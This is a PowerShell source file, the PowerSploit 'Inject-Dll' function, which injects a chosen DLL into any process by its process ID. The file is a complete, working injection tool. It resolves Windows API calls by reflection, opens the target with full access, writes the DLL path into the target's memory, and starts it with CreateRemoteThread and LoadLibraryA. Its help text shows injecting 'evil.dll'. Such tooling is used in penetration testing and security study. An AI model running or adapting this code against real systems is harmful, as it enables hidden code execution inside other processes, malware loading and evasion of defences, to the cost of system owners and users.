function Inject-Dll {

<#
.Synopsis

 PowerSploit Module - Inject-Dll
 Author: Matthew Graeber (@mattifestation)
 License: BSD 3-Clause
 
.Description

 Inject-Dll injects a Dll into the process ID of your choosing.
 
.Parameter ProcessID

 Process ID of the process you want to inject a Dll into.
 
.Parameter Dll

 Name of the dll to inject. This can be an absolute or relative path.
 
.Example

 PS> Inject-DLL 4274 evil.dll
 
 Description
 -----------
 Inject 'evil.dll' into process ID 4274.
 
.Notes

 Use the '-Verbose' option to print detailed information.
 
.Link

 My blog: http://www.exploit-monday.com
#>

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Int] $ProcessID,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Dll
    )

    try {
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    } catch [System.Management.Automation.ActionPreferenceStopException] {
        Write-Warning "Process does not exist!"
        return
    }
    
    try {
        $Dll = (Resolve-Path $Dll -ErrorAction Stop).Path
        Write-Verbose "Full path to Dll: $Dll"
        $AsciiEncoder = New-Object System.Text.ASCIIEncoding
        $DllByteArray = $AsciiEncoder.GetBytes($Dll)
    } catch [System.Management.Automation.ActionPreferenceStopException] {
        Write-Warning "Invalid Dll path!"
        return
    }

    function Get-DelegateType
    {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $Parameters,
            [Parameter(Position = 1)] [Type] $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        return $TypeBuilder.CreateType()
    }

    function Get-ProcAddress
    {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
            [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        # Return the address of the function
        
        return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
    $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
    $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32]) ([Bool])
    $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
    $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
    $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
    $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
    $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $64bitCPU = $true
    
    if ([IntPtr]::Size -eq 4) { $PowerShell32bit = $true } else { $PowerShell32bit = $false }
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
    if ($IsWow64ProcessAddr) {
    	$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
    } else {
    	$64bitCPU = $false
    }

    # Open a handle to the process you want to inject into
    $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
    if (!$hProcess) { Write-Warning 'Unable to open process handle.'; return }

    if ($64bitCPU) # Only perform theses checks if CPU is 64-bit
    {
        # Parse PE header to see if DLL was compiled 32 or 64-bit
        $DllFileStream = New-Object System.IO.FileStream($Dll, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        # Seek to 0x3c - IMAGE_DOS_HEADER.e_lfanew (i.e. Offset to PE Header)
        $temp = $DllFileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin)
        [Byte[]]$TempByteArray = New-Object Byte[](4)
        # Read offset to the PE Header (will be read in reverse)
        $Temp = $DllFileStream.Read($TempByteArray,0,4)
        $PEOffset = [Int] ('0x{0}' -f (( $TempByteArray[-1..-4] | % { $_.ToString('X2') } ) -join ''))
        Write-Verbose "PE Offset: 0x$($PEOffset.ToString('X8'))"
        # Seek to IMAGE_FILE_HEADER.IMAGE_FILE_MACHINE
        $DllFileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
        [Byte[]]$TempByteArray2 = New-Object Byte[](2)
        # Read compiled architecture
        $Temp = $DllFileStream.Read($TempByteArray2,0,2)
        $Architecture = '{0}' -f (( $TempByteArray2[-1..-2] | % { $_.ToString('X2') } ) -join '')
        Write-Verbose "DLL Architecture: 0x$Architecture"
        if (($Architecture -ne '014C') -and ($Architecture -ne '8664')) { Write-Warning 'Only x86 or AMD64 architechtures supported.'; return }
        $DllFileStream.Close()

        # Determine is the process specified is 32 or 64 bit
        $IsWow64 = $false
        $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
        if ( $PowerShell32bit -and ($Architecture -eq "8664") ) {
            Write-Warning 'You cannot manipulate 64-bit code within 32-bit PowerShell. Open the 64-bit version and try again.'; return
        }
        if ((!$IsWow64) -and ($Architecture -eq "014C")) { Write-Warning 'You cannot inject a 32-bit DLL into a 64-bit process.'; return }
        if ($IsWow64 -and ($Architecture -eq "8664")) { Write-Warning 'You cannot inject a 64-bit DLL into a 32-bit process.'; return }
    }

    # Get address of LoadLibraryA function
    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
    Write-Verbose "LoadLibrary address: 0x$($LoadLibraryAddr.ToString("X$([IntPtr]::Size*2)"))"

    # Reserve and commit memory to hold name of dll
    $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Dll.Length, 0x3000, 4) # (Reserve|Commit, RW)
    if ($RemoteMemAddr -eq [IntPtr]::Zero) { Write-Warning 'Unable to allocate memory in remote process.'; return }
    Write-Verbose "DLL path memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

    Write-Verbose "Number of chars in Dll path: $($DllByteArray.Length)"
    # Write the name of the dll to the remote process address space
    $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $DllByteArray, $Dll.Length, [Ref] 0) | Out-Null
    Write-Verbose "Dll path written sucessfully."

    # Execute dll as a remote thread
    $threadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $LoadLibraryAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
    if (!$threadHandle) { Write-Warning 'Unable to launch remote thread.'; return }
    
    $VirtualFreeEx.Invoke($hProcess, $RemoteMemAddr, $Dll.Length, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

    # Close process handle
    $CloseHandle.Invoke($hProcess) | Out-Null

    Write-Verbose 'Dll injection complete!'
    Write-Verbose 'Execute `(Get-Process -Id [ProcessId]).Modules` to confirm.'
    
}
